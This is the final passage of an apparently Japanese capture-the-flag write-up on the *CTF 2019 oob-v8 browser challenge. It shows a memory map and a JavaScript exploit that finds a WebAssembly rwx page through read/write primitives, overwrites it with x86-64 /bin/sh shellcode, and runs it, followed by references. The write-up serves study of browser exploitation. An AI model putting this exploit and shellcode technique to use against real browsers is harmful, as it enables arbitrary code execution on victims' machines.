     0xa06767c2000      0xa06767e7000 r-xp    25000      0 [anon_a06767c2]
     0xa06767e7000      0xa06767ff000 ---p    18000      0 [anon_a06767e7]
     0xa06767ff000      0xa0676800000 ---p     1000      0 [anon_a06767ff]
     0xa0676800000      0xa0676801000 rw-p     1000      0 [anon_a0676800]
     0xa0676801000      0xa0676802000 ---p     1000      0 [anon_a0676801]
     0xa0676802000      0xa067683f000 r-xp    3d000      0 [anon_a0676802]
     0xa067683f000      0xa067e791000 ---p  7f52000      0 [anon_a067683f]
    0x1401b92c0000     0x1401b9300000 rw-p    40000      0 [anon_1401b92c0]
    0x18e08ca40000     0x18e08ca5e000 rw-p    1e000      0 [anon_18e08ca40]
    0x1a805d2c0000     0x1a805d300000 rw-p    40000      0 [anon_1a805d2c0]
    0x1d09c5500000     0x1d09c5540000 rw-p    40000      0 [anon_1d09c5500]
    0x261810a00000     0x261810a40000 r--p    40000      0 [anon_261810a00]
    0x2c2ad0140000     0x2c2ad0141000 rwxp     1000      0 [anon_2c2ad0140]  <- cake
*/

let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let f = wasm_instance.exports.main;

let rwx_addr = aar(addrof(wasm_instance) + 0x88n);
hexPrint(rwx_addr)

let aaw_buf = new ArrayBuffer(0x400);
let dv = new DataView(aaw_buf);
let backing_store_addr = addrof(aaw_buf) + 0x20n;
aaw(backing_store_addr, rwx_addr)

let shellcode = [72, 49, 210, 82, 72, 184, 47, 98, 105, 110, 47, 47, 115, 104, 80, 72, 137, 231, 82, 87, 72, 137, 230, 72, 141, 66, 59, 15, 5]

for (let i = 0; i < shellcode.length; i++) {
    dv.setUint8(i, shellcode[i]);
}

// Win!!
f();
```

## Flag

ローカルでシェル取っただけなので、厳密にはブラウザでjsを読み込む必要があるこの問題を解いたとは言えない (とは言っても単にscriptタグのsrcで読み込むhtmlを用意すれば良いだけだが)

## References

- [Exploiting v8: \*CTF 2019 oob-v8](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)
- [\*CTF 2019 - oob-v8 - Binary Exploitation](https://ir0nstone.gitbook.io/notes/types/browser-exploitation/ctf-2019-oob-v8): ビルド手順に関して一番参考になった
- mapについて
	- [.:: Phrack Magazine ::.](http://www.phrack.org/issues/70/9.html): 今回は登場しないJITを利用するエクスプロイトの説明だが、mapについての説明がある
	- [katagaitai CTF勉強会 #11 Pwnable編 - PlaidCTF 2016 Pwnable666 js_sandbox / katagaitai CTF #11 - Speaker Deck](https://speakerdeck.com/bata_24/katagaitai-ctf-number-11?slide=70): 70ページから
	- [V8のHidden Classの話](https://engineering.linecorp.com/ja/blog/v8-hidden-class)

---

[^1]: gdbで`p/f 0x11c27c950589`を実行した

[^2]: 実際には浮動小数点数に変換して代入する
